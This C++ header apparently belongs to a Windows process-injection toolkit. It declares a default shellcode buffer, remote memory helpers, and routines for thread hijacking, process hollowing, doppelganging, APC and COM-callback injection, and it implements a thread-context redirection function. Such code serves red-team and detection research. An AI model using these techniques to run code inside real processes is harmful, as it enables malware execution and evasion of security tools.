#pragma once

#include <cstdint>

#include "phnt_windows.h"
#include "phnt.h"

#include "sysapi.h"

namespace scripts {

extern char *default_shellcode_data;
extern size_t default_shellcode_size;

enum class RemoteProcessMemoryMethod : uint8_t {
    AllocateInAddr,
    CreateSectionMap,
    CreateSectionMapLocalMap,
    MaxValue = CreateSectionMapLocalMap
};

const char *decode(RemoteProcessMemoryMethod memory_method);


struct RemoteProcessMemoryContext {

    RemoteProcessMemoryMethod method = (RemoteProcessMemoryMethod)-1;

    HANDLE ProcessHandle = NULL;
    PVOID RemoteBaseAddress = nullptr;
    ULONG Size = 0;

    HANDLE Section = NULL;
    PVOID LocalBaseAddress = nullptr;
};

bool process_create_memory(RemoteProcessMemoryContext& ctx);
bool process_read_memory(const RemoteProcessMemoryContext& ctx, size_t offset, PVOID Data, SIZE_T Size);
bool process_write_memory(const RemoteProcessMemoryContext& ctx, size_t offset, PVOID Data, SIZE_T Size);
bool process_memory_create_write(RemoteProcessMemoryContext& ctx, PVOID Data, SIZE_T Size);
bool process_memory_create_write_fixup_addr(RemoteProcessMemoryContext& ctx, PVOID Data, SIZE_T Size, RemoteProcessMemoryContext& ctx_fixup, size_t offset_fixup);

bool process_pe_image_relocate(const RemoteProcessMemoryContext& ctx, PVOID ImageBuffer);

//

bool process_write_params(HANDLE ProcessHandle, PRTL_USER_PROCESS_PARAMETERS Params, PVOID PebBaseAddress, RemoteProcessMemoryMethod method);

unique_c_mem<PEB> process_read_peb(HANDLE ProcessHandle);

sysapi::unique_handle process_find_alertable_thread(HANDLE ProcessHandle);

//

template <bool is_new_thread, bool is_64>
// in case of new thread we need to change AddressOfEntryPoint which is RCX/EAX
// in case of active thread we need to change RIP/EIP
bool thread_set_execute(HANDLE ThreadHandle, PVOID ExecAddress) {

    using THREAD_CONTEXT = std::conditional_t<is_64, CONTEXT, WOW64_CONTEXT>;

    unique_c_mem<THREAD_CONTEXT> context;
    if (!context.allocate()) {
        return false;
    }

    memset(context.data(), 0, sizeof(THREAD_CONTEXT));

    context->ContextFlags = CONTEXT_FULL;

    wprintf(L"  [*] getting old thread context...\n");

    bool res;

    if constexpr (is_64) {
        res = sysapi::ThreadGetContext(ThreadHandle, context.data());
    }
    else {
        res = sysapi::ThreadGetWow64Context(ThreadHandle, context.data());
    }

    if (!res) {
        return false;
    }

    wprintf(L"  [*] setting thread context with address to execute at 0x%p...\n", ExecAddress);

    if constexpr (is_64) {
        if constexpr (is_new_thread) {
            context->Rcx = (DWORD64)(UINT_PTR)ExecAddress;
        }
        else {
            context->Rip = (DWORD64)(UINT_PTR)ExecAddress;
        }

        res = sysapi::ThreadSetContext(ThreadHandle, context.data());
    }
    else {
        if constexpr (is_new_thread) {
            context->Eax = (DWORD)(UINT_PTR)ExecAddress;
        }
        else {
            context->Eip = (DWORD)(UINT_PTR)ExecAddress;
        }

        res = sysapi::ThreadSetWow64Context(ThreadHandle, context.data());
    }

    if (!res) {
        return false;
    }

    return true;
}

//

bool inject_hijack_remote_thread(uint32_t pid, RemoteProcessMemoryMethod method);
bool inject_create_remote_thread(uint32_t pid, RemoteProcessMemoryMethod method);
bool inject_create_process_hollow(const std::wstring& original_image,
                                  const std::wstring& injected_image,
                                  RemoteProcessMemoryMethod method);
bool inject_create_process_doppel(const std::wstring& original_image,
                                  const std::wstring& injected_image,
                                  RemoteProcessMemoryMethod method);
bool inject_queue_apc(uint32_t pid, uint32_t tid, RemoteProcessMemoryMethod method);
bool inject_queue_apc_early_bird(const std::wstring& original_image, RemoteProcessMemoryMethod method);
bool inject_com_irundown_docallback(uint32_t pid, RemoteProcessMemoryMethod method);
}